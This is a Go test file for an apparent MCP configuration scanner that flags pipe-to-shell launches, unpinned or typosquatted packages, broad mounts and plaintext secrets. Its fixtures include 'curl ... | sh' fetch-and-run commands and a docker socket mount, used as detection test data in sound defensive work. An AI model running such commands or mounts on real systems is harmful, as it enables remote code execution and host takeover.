package config

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/Caseymccallum/slopscan/internal/registry"
)

// The configs real agents load: the mcpServers shape of Claude Desktop/Cursor/Windsurf and the
// servers shape of VS Code. A parser that models anything else reports nothing true - which is
// exactly the failure the field keeps reporting against every other scanner.

const claudeDesktop = `{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem@0.6.2", "/"],
      "env": {"API_TOKEN": "ghp_thisIsAFakeTokenForTests1234"}
    },
    "weather": {
      "command": "uvx",
      "args": ["mcp-weather==1.0.0"]
    }
  }
}`

const vsCode = `{
  "servers": {
    "docs": { "type": "stdio", "command": "node", "args": ["/opt/docs-server.js"] },
    "remote-tools": { "type": "http", "url": "http://tools.example.com/mcp" }
  }
}`

func loadOne(t *testing.T, raw, name string) Entry {
	t.Helper()
	entries, err := Load("test-config.json", []byte(raw))
	if err != nil {
		t.Fatal(err)
	}
	for _, entry := range entries {
		if entry.Name == name {
			return entry
		}
	}
	t.Fatalf("entry %q not found in %v", name, entries)
	return Entry{}
}

func TestClaudeDesktopShapeIsParsed(t *testing.T) {
	entry := loadOne(t, claudeDesktop, "filesystem")
	if entry.Type != "stdio" || entry.Command != "npx" {
		t.Errorf("got %+v, want a stdio npx entry", entry)
	}
	if len(entry.Args) != 3 || entry.Args[2] != "/" {
		t.Errorf("args did not travel: %v", entry.Args)
	}
	if entry.Env["API_TOKEN"] == "" {
		t.Error("env did not travel")
	}
}

func TestVSCodeShapeIsParsed(t *testing.T) {
	entries, err := Load("vscode.json", []byte(vsCode))
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 2 {
		t.Fatalf("got %d entries, want 2", len(entries))
	}
	remote := loadOne(t, vsCode, "remote-tools")
	if remote.Type != "http" || remote.URL == "" {
		t.Errorf("remote entry misread: %+v", remote)
	}
}

// Non-string args and env values exist in the wild; a parser that fails on them reports nothing.
func TestNonStringValuesAreTolerated(t *testing.T) {
	entry := loadOne(t, `{"mcpServers": {"x": {"command": "node", "args": [1, true], "env": {"PORT": 8080}}}}`, "x")
	if len(entry.Args) != 2 || entry.Args[0] != "1" {
		t.Errorf("args did not stringify: %v", entry.Args)
	}
	if entry.Env["PORT"] != "8080" {
		t.Errorf("env did not stringify: %v", entry.Env)
	}
}

// The format nobody warned you about: the same config as YAML.
func TestYAMLConfigIsParsed(t *testing.T) {
	entry := loadOne(t, "mcpServers:\n  x:\n    command: npx\n    args: [\"-y\", \"pkg\"]\n", "x")
	if entry.Command != "npx" {
		t.Errorf("yaml config misread: %+v", entry)
	}
}

// The failure mode that made every other scanner useless on this input: a real config parsed to
// nothing and reported NO_AUTH. An unreadable shape is an error, not an empty clean report.
func TestForeignShapeIsAnErrorNotAnEmptyReport(t *testing.T) {
	if _, err := Load("x.json", []byte(`{"serverUrl": "https://x", "transport": "http"}`)); err == nil {
		t.Error("a config with no mcpServers or servers block was accepted")
	}
	if _, err := Load("x.json", []byte(`not json or yaml at all`)); err == nil {
		t.Error("garbage was accepted")
	}
}

func TestPipeToShellIsFound(t *testing.T) {
	entry := Entry{Type: "stdio", Command: "sh", Args: []string{"-c", "curl -fsSL https://x.sh | sh"}}
	found := false
	for _, finding := range Check(entry) {
		if finding.Kind == "launch-execution" && finding.OWASP == "MCP05" && finding.Severity == "high" {
			found = true
		}
	}
	if !found {
		t.Errorf("curl|sh launch not found: %v", Check(entry))
	}
}

func TestUnpinnedPackageIsFound(t *testing.T) {
	entry := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "@modelcontextprotocol/server-filesystem"}}
	if findings := Check(entry); !hasKind(findings, "unpinned-package") {
		t.Errorf("unpinned package not found: %v", findings)
	}

	pinned := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "@modelcontextprotocol/server-filesystem@0.6.2"}}
	if findings := Check(pinned); hasKind(findings, "unpinned-package") {
		t.Errorf("a pinned package was flagged: %v", findings)
	}

	latest := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "some-pkg@latest"}}
	if findings := Check(latest); !hasKind(findings, "unpinned-package") {
		t.Errorf("@latest masquerading as a pin was not flagged: %v", findings)
	}
}

// A filesystem server handed / or a home directory owns everything under it.
func TestBroadMountIsFound(t *testing.T) {
	root := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "fs-server", "/"}}
	if findings := Check(root); !hasKind(findings, "broad-mount") {
		t.Errorf("handing the server / was not flagged: %v", findings)
	}

	docker := Entry{Type: "stdio", Command: "docker", Args: []string{"run", "-v", "/var/run/docker.sock:/var/run/docker.sock", "img"}}
	if findings := Check(docker); !hasKind(findings, "broad-mount") {
		t.Errorf("the docker socket mount was not flagged: %v", findings)
	}

	scoped := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "fs-server", "/home/user/projects"}}
	if findings := Check(scoped); hasKind(findings, "broad-mount") {
		t.Errorf("a scoped directory was flagged: %v", findings)
	}
}

func TestSecretEnvIsFound(t *testing.T) {
	entry := Entry{Type: "stdio", Command: "node", Args: []string{"srv.js"},
		Env: map[string]string{"GITHUB_TOKEN": "ghp_faketoken", "HOME": "/home/u"}}
	if findings := Check(entry); !hasKind(findings, "secret-env") {
		t.Errorf("plaintext secret not found: %v", findings)
	}

	// A placeholder names a secret instead of being one - the whole point of ${VAR}.
	indirect := Entry{Type: "stdio", Command: "node",
		Env: map[string]string{"GITHUB_TOKEN": "${GITHUB_TOKEN}"}}
	if findings := Check(indirect); hasKind(findings, "secret-env") {
		t.Errorf("an env indirection was flagged: %v", findings)
	}
}

// The secret is named, never quoted: a scanner that prints what it found has leaked it.
func TestSecretValueIsNeverEchoed(t *testing.T) {
	entry := Entry{Type: "stdio", Command: "node",
		Env: map[string]string{"API_KEY": "sk-supersecretvalue123"}}
	for _, finding := range Check(entry) {
		if strings.Contains(finding.Quote, "supersecretvalue123") {
			t.Errorf("finding quotes the secret: %+v", finding)
		}
	}
	// Nor carried in the entry a JSON report prints alongside the findings.
	safe := Redacted(entry)
	if strings.Contains(safe.Env["API_KEY"], "supersecretvalue123") {
		t.Errorf("redacted entry still carries the secret: %+v", safe)
	}
	// A placeholder is not a secret and must survive: it is how the real one gets there.
	indirect := Redacted(Entry{Type: "stdio", Env: map[string]string{"API_KEY": "${API_KEY}"}})
	if indirect.Env["API_KEY"] != "${API_KEY}" {
		t.Errorf("a placeholder was redacted: %+v", indirect)
	}
}

// The scoping honesty the field demanded: NO_AUTH noise is a network concern and must never fire
// on a stdio entry - but plain HTTP on a remote one is real and must.
func TestTransportRulesScopeByType(t *testing.T) {
	stdio := Entry{Type: "stdio", Command: "node", Args: []string{"srv.js"}}
	if findings := Check(stdio); hasKind(findings, "insecure-transport") {
		t.Errorf("transport rule fired on a local process: %v", findings)
	}

	remote := Entry{Type: "http", URL: "http://tools.example.com/mcp"}
	if findings := Check(remote); !hasKind(findings, "insecure-transport") {
		t.Errorf("plain HTTP endpoint not flagged: %v", findings)
	}

	loopback := Entry{Type: "http", URL: "http://localhost:8080/mcp"}
	if findings := Check(loopback); hasKind(findings, "insecure-transport") {
		t.Errorf("loopback dev endpoint was flagged: %v", findings)
	}
}

// Every entry report says what was evaluated and what was not.
func TestNotesNameTheGap(t *testing.T) {
	if notes := Notes(Entry{Type: "stdio"}); len(notes) == 0 || !strings.Contains(notes[0], "evaluated") {
		t.Errorf("stdio entry has no scoping note: %v", notes)
	}
	if notes := Notes(Entry{Type: "http"}); len(notes) == 0 || !strings.Contains(notes[0], "Not evaluated") {
		t.Errorf("remote entry has no scoping note: %v", notes)
	}
}

// Every finding names its OWASP risk - the vocabulary findings are compared in.
func TestEveryFindingNamesItsOWASPRisk(t *testing.T) {
	entry := Entry{Type: "stdio", Command: "sh", Args: []string{"-c", "curl https://x | sh"},
		Env: map[string]string{"TOK": "literal"}, URL: "http://x.example.com"}
	for _, finding := range Check(entry) {
		if finding.OWASP == "" || finding.Kind == "" || finding.Quote == "" {
			t.Errorf("finding missing fields: %+v", finding)
		}
	}
}

func hasKind(findings []Finding, kind string) bool {
	for _, finding := range findings {
		if finding.Kind == kind {
			return true
		}
	}
	return false
}

// What a launch line fetches is what a slopsquat targets: the name alone, versions stripped.
func TestPackagesAreExtractedFromTheLaunchLine(t *testing.T) {
	entry := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "@modelcontextprotocol/server-filesystem@0.6.2"}}
	packages := Packages(entry)
	if len(packages) != 1 {
		t.Fatalf("got %d packages, want 1: %+v", len(packages), packages)
	}
	if packages[0].Name != "@modelcontextprotocol/server-filesystem" {
		t.Errorf("name not stripped to the registry name: %+v", packages[0])
	}
	if packages[0].Ecosystem != "npm" {
		t.Errorf("wrong ecosystem: %+v", packages[0])
	}

	py := Packages(Entry{Type: "stdio", Command: "uvx", Args: []string{"mcp-weather==1.0.0"}})
	if len(py) != 1 || py[0].Name != "mcp-weather" || py[0].Ecosystem != "pypi" {
		t.Errorf("uvx package wrong: %+v", py)
	}

	// A bare binary is not a package: node srv.js fetches nothing.
	if got := Packages(Entry{Type: "stdio", Command: "node", Args: []string{"srv.js"}}); len(got) != 0 {
		t.Errorf("a plain binary listed packages: %+v", got)
	}
}

func TestUnversionStripsOnlyTheVersion(t *testing.T) {
	for spec, want := range map[string]string{
		"@scope/pkg@1.2.3":  "@scope/pkg",
		"@scope/pkg":        "@scope/pkg",
		"pkg@latest":        "pkg",
		"pkg":               "pkg",
		"pkg==1.0.0":        "pkg",
		"pkg[extra]>=2":     "pkg",
	} {
		if got := unversion(spec); got != want {
			t.Errorf("unversion(%q) = %q, want %q", spec, got, want)
		}
	}
}

// The check at the moment it matters: what this config is about to install.
func TestCheckNamesFlagsWhatNoRegistryKnows(t *testing.T) {
	known := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/real-package" {
			_, _ = w.Write([]byte(`{"name":"real-package","versions":{}}`))
			return
		}
		http.NotFound(w, r)
	}))
	defer known.Close()
	checker := registry.Checker{Base: known.URL}

	entry := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "real-package"}}
	if findings := CheckNames(entry, checker, checker); len(findings) != 0 {
		t.Errorf("a published package was flagged: %v", findings)
	}

	squat := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "left-padd-async"}}
	found := false
	for _, finding := range CheckNames(squat, checker, checker) {
		if finding.Kind == "unknown-package" && finding.OWASP == "MCP04" && finding.Severity == "high" {
			found = true
		}
	}
	if !found {
		t.Errorf("slopsquat name not flagged: %v", CheckNames(squat, checker, checker))
	}
}

// A registry that cannot answer is reported as unverified, never as clean.
func TestCheckNamesSaysUnverifiedNotClean(t *testing.T) {
	dead := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer dead.Close()
	checker := registry.Checker{Base: dead.URL}

	entry := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "anything"}}
	findings := CheckNames(entry, checker, checker)
	if len(findings) != 1 || findings[0].Kind != "package-unverified" {
		t.Errorf("an unanswerable registry was not reported: %v", findings)
	}
}

// Existence is not innocence: a typosquat exists by design, and the facts that give it away -
// the shape of the name and the age of the package - become findings on the entry that fetches
// it. The gate stays for what is proven (a name nothing publishes); these are evidence.
func TestCheckNamesLooksPastExistence(t *testing.T) {
	now := time.Now().UTC().Format(time.RFC3339)
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/lodsh" {
			_, _ = w.Write([]byte(`{"name":"lodsh","time":{"created":"` + now + `"},"versions":{"1.0.0":{}}}`))
			return
		}
		if r.URL.Path == "/plain-old-package" {
			_, _ = w.Write([]byte(`{"name":"plain-old-package","time":{"created":"2019-01-01T00:00:00Z"},"versions":{"1.0.0":{}}}`))
			return
		}
		http.NotFound(w, r)
	}))
	defer server.Close()
	checker := registry.Checker{Base: server.URL}

	squat := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "lodsh"}}
	kinds := map[string]bool{}
	for _, finding := range CheckNames(squat, checker, checker) {
		kinds[finding.Kind] = true
		if finding.OWASP != "MCP04" {
			t.Errorf("slopsquat finding without MCP04: %+v", finding)
		}
	}
	if !kinds["lookalike-name"] {
		t.Errorf("the squat's shape not flagged: %v", kinds)
	}
	if !kinds["fresh-package"] {
		t.Errorf("the squat's age not flagged: %v", kinds)
	}

	// An old, uniquely named package is exactly what clean looks like.
	plain := Entry{Type: "stdio", Command: "npx", Args: []string{"-y", "plain-old-package"}}
	if findings := CheckNames(plain, checker, checker); len(findings) != 0 {
		t.Errorf("an old, distinct package was flagged: %v", findings)
	}
}

// Headers are where remote credentials live: parsed, flagged, and redacted like env values -
// a secret in a header is still a secret in a plaintext file.
func TestHeadersAreParsedFlaggedAndRedacted(t *testing.T) {
	entry := loadOne(t, `{"mcpServers": {"remote": {"type": "http", "url": "https://x.example/mcp",
		"headers": {"Authorization": "Bearer sk-live-fakevalue123", "X-Tenant": "acme"}}}}`, "remote")
	if entry.Headers["Authorization"] == "" || entry.Headers["X-Tenant"] != "acme" {
		t.Errorf("headers did not travel: %+v", entry.Headers)
	}

	found := false
	for _, finding := range Check(entry) {
		if finding.Kind == "secret-header" && finding.OWASP == "MCP01" {
			found = true
			if strings.Contains(finding.Quote, "fakevalue123") {
				t.Errorf("finding quotes the credential: %+v", finding)
			}
		}
	}
	if !found {
		t.Errorf("credential header not flagged: %v", Check(entry))
	}

	safe := Redacted(entry)
	if strings.Contains(safe.Headers["Authorization"], "fakevalue123") {
		t.Errorf("redacted entry still carries the credential: %+v", safe.Headers)
	}
	if safe.Headers["X-Tenant"] != "acme" {
		t.Errorf("an ordinary header was redacted: %+v", safe.Headers)
	}
}